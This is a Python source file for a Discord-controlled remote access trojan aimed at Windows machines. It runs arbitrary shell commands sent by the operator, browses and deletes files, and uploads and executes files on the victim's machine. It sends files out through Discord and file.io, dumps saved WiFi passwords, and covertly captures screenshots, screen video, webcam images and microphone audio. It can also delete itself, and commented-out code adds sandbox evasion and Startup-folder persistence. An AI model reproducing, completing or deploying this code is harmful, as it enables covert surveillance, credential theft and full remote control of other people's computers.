import asyncio
import ctypes
import cv2
import discord
import os
import shutil
import sounddevice
import subprocess
import sys
from datetime import datetime
from discord.ext import commands
from filesplit.merge import Merge
from json import detect_encoding
from numpy import array
#from psutil import process_iter, virtual_memory, cpu_count
from pyautogui import screenshot, size
from requests import post
from scipy.io.wavfile import write
from seedir import seedir
#from uuid import uuid4

#TODO

# Sandbox bypass
#ra = int(round(virtual_memory().total / (1024 ** 3)))
#ca = int(cpu_count(logical=False))
#if ra < 2 and ca < 2:
#    sys.exit()
#else:

temp = os.getenv('temp')

# Check if prompt name is already configured & If file already exist
# Really bad code, doesn't check if admin perms or not, same with start up path
#appdata = os.getenv('appdata')
#startup_path = f'{appdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
#if os.path.exists(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}')):
#    with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'r') as f:
#        lines = [line.rstrip('\n') for line in f]
#    if lines[1] and lines[1] in (p.name() for p in process_iter()):
#        if os.getcwd() == startup_path:
#            try:
#                prompt_name = lines[0]
#            except Exception:
#                prompt_name = str(uuid4())
#                with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
#                    f.write(f'{prompt_name}\n')
#                    f.write(f'{os.path.basename(sys.argv[0])}') 
#        elif os.path.exists(os.path.join(startup_path, lines[1])):
#            sys.exit()
#    else:
#        try:
#            prompt_name = lines[0]
#        except Exception:
#            prompt_name = str(uuid4())
#            with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
#               f.write(f'{prompt_name}\n')
#               f.write(f'{os.path.basename(sys.argv[0])}')
#else:
#    prompt_name = str(uuid4())
#    with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
#       f.write(f'{prompt_name}\n')
#       f.write(f'{os.path.basename(sys.argv[0])}')

# Check if itself is in startup path or not
#if os.path.exists(startup_path):
    #if os.getcwd() != startup_path:
        #if os.path.exists(os.path.join(startup_path, os.path.basename(sys.argv[0]))):
            #pass
        #else:
            #shutil.copyfile(sys.argv[0], os.path.join(path, os.path.basename(sys.argv[0])))
            #os.chdir(startup_path)
            #os.startfile(os.path.join(path, os.path.basename(sys.argv[0])))
    #else:
TOKEN = 'TOKEN-HERE'

prompt_name = 'test'
master = commands.Bot(command_prefix='_', intents=discord.Intents.all())
master.remove_command('help')

kernel = ctypes.WinDLL('kernel32', use_last_error=True)
kernel.SetConsoleCP(65001)
kernel.SetConsoleOutputCP(65001)

channel_id = ''

# Some functions

def check_channel(ctx):
    global channel_id
    if channel_id == ctx.channel.id:
        return True
    else:
        return False


def admincheck(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        return '```You have admin permission :)```'
    else:
        return '```You don\'t have admin permission :(```'


def takewebcam(name):
    camera = cv2.VideoCapture(0)

    # In case of taking photo when startup
    _, image = camera.read()
    _, image = camera.read()
    _, image = camera.read()

    cv2.imwrite(f'{name}.jpg', image)

    # Free resources
    camera.release()


def recordscr(seconds):
    screen_width, screen_height = size()
    screen_size = (screen_width, screen_height)
    output_filename = os.path.join(temp, 'x.mp4')

    fourcc = cv2.VideoWriter_fourcc(*'MP4V')
    out = cv2.VideoWriter(output_filename, fourcc, 30, screen_size)


    for i in range(30*seconds):
        # Capture screen content
        frame = screenshot()
        frame = array(frame)

        # Convert BGR format (used by OpenCV) to RGB format
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

        # Write the frame to the video file
        out.write(frame)

    out.release()
    cv2.destroyAllWindows()


def recordcam(seconds):
    camera = cv2.VideoCapture(0) 

    for i in range(30*seconds):

        ret, frame = camera.read()

    camera.release() 

# ---Events---

@master.event
async def on_ready():
    global channel_id, prompt_name

    # Create a channel that serves as shell
    exist = False
    guild = master.get_guild(1138503078102978632)
    category = guild.get_channel(1156164329348018216)
    for channel in category.text_channels:
        if str(channel) == prompt_name:
            exist = True
            channel_id = channel.id
    if not exist:
        await category.create_text_channel(name=prompt_name)
        channel_id = discord.utils.get(category.text_channels, name=prompt_name).id
    await master.get_channel(channel_id).send(f'```{prompt_name} Connected.```')


@master.event
async def on_command_error(ctx, error):
    if ctx.channel.id == channel_id:
        if isinstance(error, discord.ext.commands.errors.CheckFailure):
            pass
        elif isinstance(error, discord.ext.commands.errors.CommandNotFound):
            await ctx.send(embed=discord.Embed(color=discord.Color.red(), description=f'{ctx.message.content} doesn\'t exist!'))
        elif isinstance(error, discord.ext.commands.errors.MissingRequiredArgument):
            await ctx.send(embed=discord.Embed(color=discord.Color.red(), description=f'{ctx.message.content} is incomplete, missing one or more parameters!'))
        elif isinstance(error, discord.ext.commands.errors.BadArgument):
            await ctx.send(embed=discord.Embed(color=discord.Color.red(), description=f'{ctx.message.content} was entered incorrectly, one or more parameters are wrong or in the wrong place!'))
        else:
            await ctx.send(embed=discord.Embed(color=discord.Color.red(), description=f'{error}'))

# ---Commands---

@commands.check(check_channel)
@master.command(name="help", description="Returns all commands available")
async def help(ctx, specific_command: str=''):
    await ctx.message.delete()

    if specific_command == '':
        helptext = "```List of commands:\n\n"
        for command in master.commands:
            helptext+=f"{command}\n"
        helptext+="\nuse _help [command] to check specific usage \n```"
        await ctx.channel.send(helptext)
    else:
        if any(specific_command == str(command) for command in master.commands):
            await ctx.channel.send(f'```{master.get_command(specific_command).description}```')
        else:
           await ctx.send(embed=discord.Embed(color=discord.Color.red(), description=f'Command {specific_command} didn\'t found!'))


@commands.check(check_channel)
@master.command(name='clear')
async def clear(ctx):
    await ctx.channel.purge(limit=100)


@commands.check(check_channel)
@master.command(name='cmd', description='Syntax: _cmd [command] \n execute commands in cmd or powershell')
async def command_input(ctx, argument: str=''):
    await ctx.message.delete()

    cmdcommand = subprocess.Popen(argument,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  shell=True)

    return_message, error_message = '', ''
    for line in cmdcommand.stdout:
        try:
            return_message += line.decode('utf-8')
        except UnicodeDecodeError:
            return_message += line.decode('big5')
    for line in cmdcommand.stderr:
        try:
            error_message += line.decode('utf-8')
        except UnicodeDecodeError:
            error_message += line.decode('big5')

    if return_message:
        await ctx.channel.send(f'```{return_message}```')
    elif error_message:
        await ctx.channel.send(f'```{error_message}```')

# File related commands

@commands.check(check_channel)
@master.command(name='ls', description='Syntax: _ls \n checks for everything in current directory')
async def list(ctx):
    await ctx.message.delete()

    now_time = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
    embed = discord.Embed()
    embed.title = f'Content of {os.getcwd()} \n at {now_time}'
    embed.description = '\n'.join(os.listdir())
    await ctx.channel.send(embed=embed)


@commands.check(check_channel)
@master.command(name='tree', description='Syntax _tree \n checks for everything in current directory and beyond')
async def _tree(ctx):
    await ctx.message.delete()

    everything = seedir(style='lines', printout=False, depthlimit=100, beyond='content')

    with open(os.path.join(temp, 'x.txt'), 'w', encoding='utf-8') as f:
        f.write(os.getcwd() + '\n')
        f.write(everything)

    del everything

    file = discord.File(os.path.join(temp, 'x.txt'), filename='tree.txt')
    await ctx.channel.send(file=file)

    os.remove(os.path.join(temp, 'x.txt'))

@commands.check(check_channel)
@master.command(name='cd', description='Syntax: _cd [directory] \n change current directory to something else')
async def change_directory(ctx, new_directory: str):
    await ctx.message.delete()

    directories = new_directory.split('\\')

    for directory in directories:
        try:
            if directory.startswith('%') and directory.endswith('%'):
                os.chdir(os.getenv(directory.strip('%')))
            else:
                os.chdir(directory)
        except FileNotFoundError:
            await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description=f'Path "{directory}" not found.'))

    await ctx.channel.send(f'```Current directory: {os.getcwd()}```')


@commands.check(check_channel)
@master.command(name='rm', description='Syntax: _rm [file or folder] \n remove a file or folder')
async def remove(ctx, file: str):
    await ctx.message.delete()

    file_path = os.path.join(os.getcwd(), file)

    if os.path.exists(file_path):
        react_to = await ctx.channel.send(f'```[WARNING] File {file} will be deleted after react with 🗑️, or with 🔴 to cancel this action.```')
        await react_to.add_reaction('🗑️')
        await react_to.add_reaction('🔴')

        def check_emoji(reaction, user):
            return user == ctx.message.author\
            and str(reaction.emoji) == '🗑️'\
            or str(reaction.emoji) == '🔴'

        try:
            reaction, user = await master.wait_for('reaction_add',
                                                   timeout=30.0,
                                                   check=check_emoji)
        except asyncio.TimeoutError:
            await ctx.channel.send('```Action cancelled.```')
        else:
            await react_to.delete()
            if str(reaction) == '🔴':
                await ctx.channel.send('```Action cancelled.```')
            else:
                if not os.path.isdir(file_path):
                    os.remove(file_path)
                else:
                    shutil.rmtree(file_path)
                await ctx.channel.send(f'```File or folder {file} successfully deleted.```')
    else:
        await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description=f'File or folder "{file}" not found.'))


@commands.check(check_channel)
@master.command(name='pwd', description='Syntax: _pwd \n checks current working directory')
async def print_working_directory(ctx):
    await ctx.message.delete()
    await ctx.channel.send(f'```Current directory: {os.getcwd()}```')


@commands.check(check_channel)
@master.command(name='download', description='Syntax: _download [file] \n download file from client')
async def download(ctx, file: str):
    await ctx.message.delete()

    if file in os.listdir():
        file_path = os.path.join(os.getcwd(), file)
        if os.path.isdir(file):
            shutil.make_archive(file, 'zip', file)
            file_path += '.zip'
        if os.stat(file_path).st_size < 25000000:
            await ctx.channel.send(file=discord.File(file_path))
        else:
            await ctx.channel.send('```Uploading file to file.io, this will take a while...```')
            data = {
                'file': open(file_path, 'rb'),
            }
            url = 'https://file.io/'
            response = post(url, files=data)
            data = response.json()
            try:
                data = data['link']
                await ctx.channel.send(f'```Click here to download: {data}```')
            except Exception:
                await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description=f'Error when uploading, error: \n {data}'))
    else:
        await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description=f'File "{file}" doesn\'t exist!'))


@commands.check(check_channel)
@master.command(name='execute', description='Syntax: _execute [file] \n execute file from client')
async def execute(ctx, file: str):
    await ctx.message.delete()

    if file in os.listdir():
        file_path = os.path.join(os.getcwd(), file)
        os.startfile(file_path)
    else:
        await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description=f'File "{file}" doesn\'t exist!'))


@commands.check(check_channel)
@master.command(name='upload', description='Syntax: _upload [type] \n upload file to client \n\n Type:\n single uploads a single file,\n multiple uploads multiple file then combines into one')
async def upload(ctx, single_or_multiple: str, multiple_name = ''):
    await ctx.message.delete()

    if single_or_multiple == 'single':
        await ctx.channel.send('```Please send a file here to upload.```')

        def check_file(message):
            return message.author == ctx.message.author\
            and bool(message.attachments)

        try:
            file = await master.wait_for('message',
                                         timeout=60.0,
                                         check=check_file)
        except asyncio.TimeoutError:
            await ctx.channel.send('```Action cancelled.```')
        else:
            react_to = await ctx.channel.send(f'```[WARNING] This file will be uploaded to {os.getcwd()} after you react with 📤, or with 🔴 to cancel this action.```')
            await react_to.add_reaction('📤')
            await react_to.add_reaction('🔴')

            def check_emoji(reaction, user):
                return user == ctx.message.author\
                and str(reaction.emoji) == '📤'\
                or str(reaction.emoji) == '🔴'

            try:
                reaction, user = await master.wait_for('reaction_add',
                                                       timeout=30.0,
                                                       check=check_emoji)
            except asyncio.TimeoutError:
                await ctx.channel.send('```Action cancelled.```')
            else:
                if str(reaction) == '🔴':
                    await ctx.channel.send('```Action cancelled.```')
                else:
                    await react_to.delete()
                    split_v1 = str(file.attachments).split('filename=\'')[1]
                    filename = str(split_v1).split('\' ')[0]
                    file_path = os.path.join(os.getcwd(), filename)
                    await file.attachments[0].save(file_path)
                    await ctx.channel.send(f'```Uploaded {filename} to {os.getcwd()}.```')
    elif single_or_multiple == 'multiple':
        if multiple_name != '':
            await ctx.channel.send('```Please upload all the files prepared by Splitter, then type .done [amount of files]```')

            def check_done(message):
                return message.author == ctx.message.author\
                and message.content.split(' ')[0] == '.done'

            try:
                amount = await master.wait_for('message',
                                               timeout=120.0,
                                               check=check_done)
            except asyncio.TimeoutError:
                await ctx.channel.send('```Action cancelled.```')
            else:
                react_to = await ctx.channel.send(f'```[WARNING] This file will be uploaded to {os.getcwd()} after you react with 📤, or with 🔴 to cancel this action.```')
                await react_to.add_reaction('📤')
                await react_to.add_reaction('🔴')

                def check_emoji(reaction, user):
                    return user == ctx.message.author\
                    and str(reaction.emoji) == '📤'\
                    or str(reaction.emoji) == '🔴'

                try:
                    reaction, user = await master.wait_for('reaction_add',
                                                           timeout=30.0,
                                                           check=check_emoji)
                except asyncio.TimeoutError:
                    await ctx.channel.send('```Action cancelled.```')
                else:
                    if str(reaction) == '🔴':
                        await ctx.channel.send('```Action cancelled.```')
                    else:
                        os.mkdir(f'temp_{multiple_name}')

                        amount = int(amount.content.split(' ')[1])

                        async for everything in ctx.channel.history(limit=amount):
                            for i, attachment in enumerate(everything.attachments):
                                await ctx.channel.send(f'```Uploading part.{i+1} out of {len(everything.attachments)}```')
                                await attachment.save(f'temp_{multiple_name}\\{attachment.filename}')
                        await ctx.channel.send(content='```All parts uploaded, merging...```')

                        for i in os.listdir(f'temp_{multiple_name}'):
                            if i != 'manifest':
                                os.rename(f'temp_{multiple_name}\\' + i, f'temp_{multiple_name}\\' + i[:-6])

                        Merge(f'temp_{multiple_name}', os.getcwd(), multiple_name).merge(cleanup=True) 
                        shutil.rmtree(f'temp_{multiple_name}')

                        await ctx.channel.send(content=f'```Uploaded {multiple_name} into {os.getcwd()}```')
        else:
            await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description='If type is multiple, you need to enter a combined file name(with extension).'))
    else:
        await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description=f'Type {single_or_multiple} doesn\'t exist.'))


@commands.check(check_channel)
@master.command(name='wifipd', description='Syntax: _wifipd \n get wifi passwords')
async def wifipd(ctx):
    await ctx.message.delete()

    networks = subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout
    try:
        networks = networks.decode(detect_encoding(networks))
    except UnicodeDecodeError:
        networks = networks.decode(errors= "backslashreplace")
    networks = networks.strip()
    polish_bytes = ['\\xa5', '\\x86', '\\xa9', '\\x88', '\\xe4', '\\xa2', '\\x98', '\\xab', '\\xbe', '\\xa4', '\\x8f', '\\xa8', '\\x9d', '\\xe3', '\\xe0', '\\x97', '\\x8d', '\\xbd']
    polish_chars = ['ą', 'ć', 'ę', 'ł', 'ń', 'ó', 'ś', 'ź', 'ż', 'Ą', 'Ć', 'Ę', 'Ł', 'Ń', 'Ó', 'Ś', 'Ź', 'Ż']
    for i in polish_bytes:
        networks = networks.replace(i, polish_chars[polish_bytes.index(i)])
    network_names_list = []
    for profile in networks.split('\n'):
        if ': ' in profile:
            network_names_list.append(profile[profile.find(':')+2:].replace('\r', ''))
    result, password = {}, ''
    for network_name in network_names_list:
        command = 'netsh wlan show profile "' + network_name + '" key=clear'
        current_result = subprocess.run(command, capture_output=True, shell=True).stdout
        try:
            current_result = current_result.decode(detect_encoding(current_result))
        except UnicodeDecodeError:
            current_result = current_result.decode(errors= "backslashreplace")
        current_result = current_result.strip()
        for i in polish_bytes:
            current_result = current_result.replace(i, polish_chars[polish_bytes.index(i)])
        for line in current_result.split('\n'):
            if 'Key Content' in line:
                password = line[line.find(':')+2:-1]
        result[network_name] = password
    embed=discord.Embed(title='Grabbed WiFi passwords', color=0x0084ff)
    for network in result.keys():
        embed.add_field(name='🪪 ' + network, value='🔑 ' + result[network], inline=False)
    await ctx.message.channel.send(embed=embed) 

# Spy related commands

@commands.check(check_channel)
@master.command(name='screenshot', description='Syntax: _screenshot [amount] \n screenshot client\'s screen')
async def _screenshot(ctx, amount: int=1):
    await ctx.message.delete()

    for i in range(amount):
        screenshot().save(os.path.join(temp, 'x.jpg'))

        now_time = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
        embed = discord.Embed()
        embed.title = f'Screen of {prompt_name} at ``{now_time}``'
        file = discord.File(os.path.join(temp, 'x.jpg'), filename='image.jpg')
        embed.set_image(url='attachment://image.jpg')

        await ctx.channel.send(file=file, embed=embed)
        os.remove(os.path.join(temp, 'x.jpg'))


@commands.check(check_channel)
@master.command(name='recordscr', description='Syntax: _recordscr [seconds] \n record client\'s screen')
async def _recordscr(ctx, seconds: int):
    await ctx.message.delete()

    await ctx.channel.send(f'```Start recording for {seconds} seconds```')
    recordscr(seconds)
    try:
        await ctx.channel.send(file=discord.File(os.path.join(temp, 'x.mp4')))
        os.remove(os.path.join(temp, 'x.mp4'))
    except Exception as e:
        await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description=f'Error: {e}'))


@commands.check(check_channel)
@master.command(name='takewebcam', description='Syntax: _takewebcam [amount] \n take a picture of client')
async def _takewebcam(ctx, amount: int=1):
    await ctx.message.delete()

    try:
        for i in range(amount):
            takewebcam(os.path.join(temp, 'x'))

            now_time = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
            embed = discord.Embed()
            embed.title = f'Webcam of {prompt_name} at ``{now_time}``'
            file = discord.File(os.path.join(temp, 'x.jpg'), filename='image.jpg')
            embed.set_image(url='attachment://image.jpg')

            await ctx.channel.send(file=file, embed=embed)
            os.remove(os.path.join(temp, 'x.jpg'))
    except cv2.error:
        await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description='Client does not have a webcam plugged in.'))


@commands.check(check_channel)
@master.command(name='recordcam', description='Syntax: _recordcam [seconds] \n record client\'s webcam for seconds')
async def _recordcam(ctx, seconds: int):
    await ctx.message.delete()

    await ctx.channel.send(f'```Start recording for {seconds} seconds```')
    recordcam(seconds)
    try:
        await ctx.channel.send(file=discord.File(os.path.join(temp, 'x.mp4')))
        os.remove(os.path.join(temp, 'x.mp4'))
    except Exception as e:
        await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description=f'Error: {e}'))


@commands.check(check_channel)
@master.command(name='recordmic', description='Syntax: _recordmic [secounds] \n record client\'s microphone for seconds')
async def recordmic(ctx, seconds: int):
    await ctx.message.delete()

    await ctx.channel.send(f'```Start recording for {seconds} seconds```')

    try:
        recording = sounddevice.rec(int(seconds * 44100), samplerate = 44100, channels=2)
        sounddevice.wait()
        write(os.path.join(temp, 'x.wav'), 44100, recording)

        await ctx.channel.send(file=discord.File(os.path.join(temp, 'x.wav')))
        os.remove(os.path.join(temp, 'x.wav'))
    except sounddevice.PortAudioError:
        await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description='Client does not have a microphone plugged in.'))

# Others

@commands.check(check_channel)
@master.command(name='selfdestruct', description='Syntax: _selfdestruct \n delete itself and wipe everything (doesn\'t delete channel)')
async def self_destruct(ctx):
    await ctx.message.delete()

    react_to = await ctx.channel.send('```[WARNING] THIS WILL REMOVE YOUR ACCESS AFTER YOU REACT WITH 💀, or react 🔴 to cancel.```')
    await react_to.add_reaction('💀')
    await react_to.add_reaction('🔴')

    def check_emoji(reaction, user):
        return user == ctx.message.author\
        and str(reaction.emoji) == '💀'\
        or str(reaction.emoji) == '🔴'

    try:
        reaction, user = await master.wait_for('reaction_add',
                                               timeout=30.0,
                                               check=check_emoji)
    except asyncio.TimeoutError:
        await ctx.channel.send('```Action cancelled.```')
    else:
        await react_to.delete()
        if str(reaction) == '🔴':
            await ctx.channel.send('```Action cancelled.```')
        else:
            if os.path.exists(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}')):
                os.remove(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'))
            if os.path.exists(os.path.join(temp, 'x.jpg')):
                os.remove(os.path.join(temp, 'x.jpg'))
            if os.path.exists(os.path.join(temp, 'x.txt')):
                os.remove(os.path.join(temp, 'x.txt'))
            os.remove(sys.argv[0])
            sys.exit() # Waiting to confirm works


@commands.check(check_channel)
@master.command(name='changename', description='Syntax: _changename [name] \n change client\'s name')
async def change_name(ctx, name: str):
    global channel_id, prompt_name
    await ctx.message.delete()

    if name:
        with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'r') as f:
            lines = [line.rstrip('\n') for line in f]
            lines[0] = (f'{name}')
        with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
            f.write('\n'.join(line for line in lines))
        await ctx.message.channel.edit(name=f'{name}')
        guild = master.get_guild(1138503078102978632)
        category = guild.get_channel(1156164329348018216)
        channel_id = discord.utils.get(category.text_channels, name=name)
        prompt_name = name
        await ctx.channel.send(f'```Client name changed to {name}, restarting to apply...```')
        os.startfile(sys.argv[0])
        sys.exit()
    else:
        await ctx.channel.send(embed=discord.Embed(color=discord.Color.red(), description=f'Name {name} is not a valid name.'))

master.run(TOKEN)
